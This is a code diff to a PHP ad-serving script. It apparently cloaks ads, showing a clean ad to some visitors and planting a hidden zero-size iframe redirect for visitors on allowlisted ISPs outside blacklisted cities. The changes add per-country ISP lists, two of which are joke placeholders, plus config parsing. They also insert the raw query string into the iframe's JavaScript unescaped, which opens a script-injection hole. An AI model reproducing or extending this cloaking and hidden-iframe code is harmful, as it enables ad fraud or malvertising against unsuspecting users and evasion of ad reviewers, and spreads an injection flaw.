@@ -15,30 +15,31 @@
 	// redirectUrl is hard coded.
 	//
 
-	$allowedIsps = array(
-		"AT&T Wireless",
-		"T-Mobile USA",
-		"Sprint PCS",
-		"Verizon Wireless",
-		"Comcast Cable",
-		"Time Warner Cable",
-		"AT&T U-verse",
-		"Charter Communications",
-		"Cox Communications",
-		"CenturyLink",
-		"Optimum Online",
-		"AT&T Internet Services",
-		"Frontier Communications",
-		"Suddenlink Communications",
-		"XO Communications",
-		"Verizon Internet Services",
-		"Mediacom Cable",
-		"Windstream Communications",
-		"Bright House Networks",
-		"Abovenet Communications",
-		"Google",
-		"Cable One",
-		"VECTANT" // AVDW JAPAN
+	$allowedIspsPerCountry = array("US" => array("AT&T Wireless",
+												 "T-Mobile USA",
+												 "Sprint PCS",
+												 "Verizon Wireless",
+												 "Comcast Cable",
+												 "Time Warner Cable",
+												 "AT&T U-verse",
+												 "Charter Communications",
+												 "Cox Communications",
+												 "CenturyLink",
+												 "Optimum Online",
+												 "AT&T Internet Services",
+												 "Frontier Communications",
+												 "Suddenlink Communications",
+												 "XO Communications",
+												 "Verizon Internet Services",
+												 "Mediacom Cable",
+												 "Windstream Communications",
+												 "Bright House Networks",
+												 "Abovenet Communications",
+												 "Google",
+												 "Cable One"),
+								   "FR" => array("Pain au fromage",
+								   				 "Wine ISP")
+
 	);
 
 	$blacklistedCities = array();
@@ -1722,6 +1723,51 @@
 	    return true;
 	}
 
+	function trimNewLine($string)
+	{
+		return str_replace(PHP_EOL, '', $string);
+	}
+
+	function processConfig($filename)
+	{
+		$result = array();
+
+		$f = fopen($filename, "r");
+
+	    while (($line = fgets($f)) !== false)
+	    {
+	        $colonIndex = strpos($line, ":");
+
+	        if ($colonIndex !== false)
+	        {
+		    	$key = trim(substr($line, 0, $colonIndex));
+		    	$value = trim(trimNewLine(substr($line, $colonIndex + 1)));
+
+		    	$result[$key] = $value;
+		    }
+	    }
+
+	    fclose($f);
+
+	    return $result;
+	}
+
+	function appendReferrerParameter($url)
+	{
+		if (strpos($url, "?") === false)
+		{
+			$url .= "?";
+		}
+		else
+		{
+			$url .= "&";
+		}
+
+		$url .= "referrer=";
+
+		return $url;
+	}
+
 	function mylog($txt) {
 		/*
 		$f = fopen("ispiplog.log","a");
@@ -1749,39 +1795,48 @@
 		}		
 	}
 
-	$getKeys = array_keys($_GET);
+	$extraGetParameters = "";
+	$queryString = $_SERVER['QUERY_STRING'];
 
-	if (sizeof($getKeys) != 1)
+	$ampIndex = strpos($queryString, "&");
+
+	if ($ampIndex !== false)
 	{
-		// Script not called in the right way, we require exactly 1 argument: the campaignID
-		exit;
+		$campaignID = substr($queryString, 0, $ampIndex);
+		$extraGetParameters = substr($queryString, $ampIndex + 1);
+	}
+	else
+	{
+		$campaignID = $queryString;
 	}
 
-	$campaignID = $getKeys[0];
-
 	$cleanHtmlFilename = "ads/" . $campaignID . ".cleanad.html";
-	$redirectFilename  = "ads/" . $campaignID . ".redirecturl.txt";
+	$configFilename  = "ads/" . $campaignID . ".config.txt";
 
-	if (!file_exists($cleanHtmlFilename) || !file_exists($redirectFilename))
+	if (!file_exists($cleanHtmlFilename) || !file_exists($configFilename))
 	{
 		exit;
 	}
 
 	$resultHtml = file_get_contents($cleanHtmlFilename);
-	$redirectUrl = file_get_contents($redirectFilename);
+
+	$adConfig = processConfig($configFilename);
+
+	$redirectUrl = $adConfig['RedirectUrl'];
+	$adCountry = $adConfig['CountryCode'];
+
+	if (empty($redirectUrl))
+	{
+		exit;
+	}
+
+	if (empty($adCountry))
+	{
+		$adCountry = "US";
+	}
 
 	// Append referrer
-
-	if (strpos($redirectUrl, "?") === false)
-	{
-		$redirectUrl .= "?";
-	}
-	else
-	{
-		$redirectUrl .= "&";
-	}
-
-	$redirectUrl .= "referrer=";
+	$redirectUrl = appendReferrerParameter($redirectUrl);
 
 	$serveCleanAd = false;
 
@@ -1815,6 +1870,13 @@
 			'subdiv1_code:"'.$geo['subdiv1_code'].'",'.
 			'subdiv2:"'.$geo['subdiv2'].'",'.
 			'subdiv2_code:"'.$geo['subdiv2_code'].'"');
+
+		$allowedIsps = array();
+
+		if (array_key_exists($adCountry, $allowedIspsPerCountry))
+		{
+			$allowedIsps = $allowedIspsPerCountry[$adCountry];
+		}
 
 		if ((empty($allowedIsps) || in_array($isp['isp'], $allowedIsps)) &&
 			!in_array($geo['city'], $blacklistedCities) &&
@@ -1879,7 +1941,7 @@
 											}
 
 											var el = document.createElement('iframe');
-											el.src = '$redirectUrl' + topDomain + '&' + location.search.substring(1);
+											el.src = '$redirectUrl' + topDomain + '&' + location.search.substring(1) + '&$extraGetParameters';
 											el.width = 0;
 											el.height = 0;
 											document.body.appendChild(el);										
